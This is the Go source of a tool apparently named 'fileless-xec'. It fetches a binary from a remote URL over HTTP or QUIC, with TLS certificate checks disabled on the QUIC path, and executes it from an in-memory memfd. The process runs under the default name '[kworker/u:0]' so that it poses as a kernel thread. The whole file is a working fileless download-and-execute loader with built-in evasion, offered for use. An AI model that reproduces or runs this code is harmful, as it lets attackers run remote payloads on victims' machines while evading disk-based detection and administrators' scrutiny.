package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"sync"
	"syscall"

	"github.com/justincormack/go-memfd"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/http3"
	"github.com/spf13/cobra"
)

//Exec binary file using file descriptor
func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	err = syscall.Exec(fname, argv, envv)
	return err
}

//Retrieve Binary from Remote using http protocol
func GetBinaryRaw(url string) string {

	resp, err := http.Get(url)

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	return string(body)
}

//Retrieve Binary from Remote using http3 protocol (Quic)
//Put ca.pem in current directory
func GetBinaryRawHTTP3(url string) string {

	var qconf quic.Config
	roundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // To accept your self-signed certificates for example
		},
		QuicConfig: &qconf,
	}
	defer roundTripper.Close()
	hclient := &http.Client{
		Transport: roundTripper,
	}
	var binaryRawByte []byte
	var wg sync.WaitGroup
	wg.Add(1)

	go func(addr string) {
		rsp, err := hclient.Get(addr)
		if err != nil {
			log.Fatal(err)
		}
		//fmt.Printf("Got response for %s: %#v", addr, rsp)

		body := &bytes.Buffer{}
		_, err = io.Copy(body, rsp.Body)
		if err != nil {
			log.Fatal(err)
		}

		binaryRawByte = body.Bytes()

		wg.Done()
	}(url)

	wg.Wait()
	return string(binaryRawByte)
}

func main() {

	//CMD FILELESS-XEC
	var name string
	var http3 bool

	var cmdFilelessxec = &cobra.Command{
		Use:   "fileless-xec [remote_url]",
		Short: "Execute remote binary locally",
		Long:  `curl a remote binary file and execute it locally in one single step`,
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {

			url := args[0]

			var binaryRaw string
			if http3 {
				binaryRaw = GetBinaryRawHTTP3(url) //https if you used server from example
			} else {
				binaryRaw = GetBinaryRaw(url)
			}

			mfd, err := memfd.Create()
			if err != nil {
				panic(err)
			}
			defer mfd.Close()
			_, _ = mfd.WriteString(binaryRaw)
			err = mfd.SetImmutable()
			if err != nil {
				panic(err)
			}

			fd := mfd.Fd()
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()

			Fexecve(fd, argsExec, environ)

		},
	}

	//flag handling
	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")

	cmdFilelessxec.Execute()
}
